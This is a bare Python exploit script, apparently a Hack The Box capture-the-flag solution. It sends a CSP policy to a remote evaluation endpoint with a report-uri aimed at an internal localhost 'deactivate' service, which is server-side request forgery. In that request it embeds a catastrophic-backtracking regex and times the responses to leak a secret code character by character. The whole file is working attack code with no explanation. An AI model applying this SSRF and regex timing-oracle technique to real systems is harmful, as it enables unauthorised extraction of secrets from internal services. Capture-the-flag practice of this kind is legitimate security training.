import requests, sys
from time import time
eval_endpoint = "http://167.71.137.246:30152/api/evaluate"
deactivate_endpoint = "http://127.1:1337/deactivate"

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

prefix='^(?=HTB{'
suffix=".*})((.*)*)*salt$"

r = []
for char in alphabet:
	begin= time()
	guess = prefix + char + suffix

	u = deactivate_endpoint + "?secretCode=" + guess
	header={
		"content-type": "application/json"
	}
	data = {
	    "csp": "report-uri " + u 
	}
	requests.post(eval_endpoint,json=data,headers=header)
	print(time()-begin)
	r.append([char,time()- begin])
r=sorted(r, key= lambda x: x[1])
for d in r[::-1][:3]:
    print('[*] {} : {}'.format(d[0], d[1]))
